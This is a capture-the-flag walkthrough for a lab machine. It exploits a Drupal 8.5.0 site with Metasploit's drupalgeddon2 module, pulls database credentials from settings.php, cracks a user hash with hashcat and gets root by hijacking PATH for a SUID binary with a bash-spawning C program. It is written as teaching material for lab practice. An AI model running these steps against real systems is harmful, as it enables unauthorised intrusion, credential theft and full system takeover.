# GNTM
&nbsp;

## Initial Foothold

We run nmap.
```
$ nmap -A -v 172.30.0.0/24
```

Nmap discovered port **80** and port **22** on host **172.30.0.2**. If we open up a web browser and hit the IP we get the Apache default web page. Lets search for directories.
```
$ dirb http://172.30.0.2
```

From **dirb** we got **fashion** directory. So if we hit **http://172.30.0.2/fashion** we get a web site. The web site is developed with drupal. Next step, we scan the drupal web site with **droopscan** to find out the version.
```
$ git clone https://github.com/droope/droopescan.git
$ cd droopescan
$ ./droopescan scan -u 172.30.0.2/fashion
```

The version of the drupal is 8.5.0. After a little searching we came up with a critical vulnerability in this specific version of drupal. Metasploit framework will do the work for as.
```
$ msfconsol
$ use unix/webapp/drupal_drupalgeddon2
$ set RHOST 172.30.0.2
$ set TARGETURI fashion
$ shell
```

Now we have a basic shell and we are logged in as www-data. Searching the structure of drupal, we can see that the administrator didn't delete the **settings.php** file after the installation.
```
$ cat sites/default/settings.php
```

This file contains the credentials about the databases. Username: **admin** and password **mitroglou**. We can't get an interactive connection with mysql, so we are going to execute one command at a time and after some time we will get to that.
```
$ mysql -u admin -p -e 'use drupal; select * from users_field_data;'
```

User kazarian has a hashed password. Lets see if it is crackable. Put the hash in a file (main is called hash), find the hash type and run hashcat.
```
$ hashcat --help | grep Drupal
    7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks
$ sudo hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt --force
    emmawatson
```

The password is **"emmawatson"**. Back to nmap results, port 22 is open. Lets try ssh on user kazarian.
```
$ ssh kazarian@172.30.0.2
$ cat user.txt
```

And we got the user.

&nbsp;
## Privilege Escalation

Enumerating the system.
```
$ find / -perm -4000 -exec ls -l {} \; 2>/dev/null
-rwsr-xr-x 1 root root 756072 Sep  8 22:39 /usr/local/bin/check
```

There is a program called **check**. As we can see, special permission has been set on this file and we can execute with root privilages. Lets see what the program does.
```
$ check 
00069f1bbf0c23d21578050924cdf148cf91e6dee20e18bec329e8180a1aa24e
00053462a9e83977be9f54b2aa48243b8101a23f1f025b73b01fdd1582ce426a
000afba64da39251c788bbe81e9531e040116840c0c13d7aeb2e3920eaa00cea
```

It prints some hashes, nothing helpful. Copy the program locally for further examination.
```
$ scp kazarian@172.30.0.2:/usr/local/bin/check .
$ ./check
Try harder!!!
```

Commands like **"strings"**, **"ltrace"** and **"nm"** wont help because the the program is statically linked and the output is huge.

We will reverse the file to see the flow of the code.
```
$ radare2 ./check
$ aaaa
$ afll
$ pdf@main
lea rdi, qword str.tail__n_50__root_list.txt ; 0x47d024 ; "tail -n 50 /root/list.txt"
call sym.system
```

There is a system call in which the program run the command **"tail -n 50 /root/list.txt"**. It is well known that the system calls without the full path specified are vulnerable. Here is the way to exploit this vulnerability. First write a program in **C** with the name **tail**, in which a bash will be spawned.
```
#include <stdio.h>      /* printf */
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */
#include <unistd.h>
#include <sys/types.h>

int main ()
{
    system ("/bin/bash -i");
    return 0;
}
```

The go on and compile it and send it to the remote server.
```
$ gcc tail.c -o tail
$ chmod +x tail
$ scp tail kazarian@172.30.0.2:/tmp/tail
```

Then add your current path at the beginning of **$PATH** and run **check** again.
```
$ echo $PATH
$ PATH=$PWD:$PATH
$ check
```

This time **check** will look at your current path first and will execute your **tail** program and once **SUID** is set, it's going to executed as root.
```
$ cat /root/root.txt
```

And we got root!!!
